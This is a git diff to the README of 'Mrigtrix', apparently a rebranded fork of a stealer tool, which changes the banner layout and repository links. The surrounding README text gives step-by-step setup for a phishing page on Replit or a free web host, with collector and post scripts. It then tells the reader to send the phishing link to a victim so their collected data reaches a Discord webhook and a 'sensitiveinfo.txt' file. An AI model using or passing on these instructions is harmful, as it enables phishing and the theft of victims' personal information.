@@ -1,3 +1,4 @@
+<div align="center">
 <pre>
 ███╗   ███╗██████╗ ██╗ ██████╗████████╗██████╗ ██╗██╗  ██╗    
 ████╗ ████║██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝    
@@ -6,6 +7,7 @@
 ██║ ╚═╝ ██║██║  ██║██║╚██████╔╝  ██║   ██║  ██║██║██╔╝ ██╗    
 ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    
 </pre>
+</div>
 
 ---
 # Mrigtrix
@@ -37,11 +39,11 @@ If you found this tool useful, consider leaving a star to support future develop
 
 ### Method 0: Replit
 
-  [![Run on Repl.it](https://repl.it/badge/github/swagkarna/Nivistealer)](https://repl.it/github/swagkarna/Nivistealer)
+  [![Run on Repl.it](https://repl.it/badge/github/AnuragBathani/Mrigtrix)](https://repl.it/github/AnuragBathani/Mrigtrix)
 
-- Click the above button  or [click here](https://repl.it/github/swagkarna/Nivistealer) to run on `repl.it`
+- Click the above button  or [click here](https://repl.it/github/AnuragBathani/Mrigtrix) to run on `repl.it`
 - Login/Signup on [repl.it](https://repl.it)
-- After it clones the repo edit <a href="https://github.com/swagkarna/Nivistealer/blob/bfb77519443a90613fab8f55c1a534b8918c5345/python_flask/index.html#L185">this</a> line with your repl url
+- After it clones the repo edit <a href="https://github.com/AnuragBathani/Mrigtrix/blob/324ac626f15017354e975d3a04aa52144b3f5442/python_flask/index.html#L233">this</a> line with your repl url
 - Now click Run
 
 ---
@@ -50,7 +52,7 @@ If you found this tool useful, consider leaving a star to support future develop
 - Clone or Download this repo
 - Create a account on any webhosting site that provide ssl . I suggest a free webhosting site called ```000webhost.com```
 - Now upload ```index.html,collector.php,post.php``` on your webhosting site
-- Now open index.html and replace <A href="https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/index.html#L80">this</a> with your ```discord webhook url```  
+- Now open index.html and replace <A href="https://github.com/AnuragBathani/Mrigtrix/blob/282851ee043498b50ba31f248dd5baf964522030/index.html#L194">this</a> with your ```discord webhook url```  
 - Boom !!! . Now send the phishing link to your victim . Logs will be send to your discord webhook and also saved to ```sensitiveinfo.txt``` file 
 
 ---
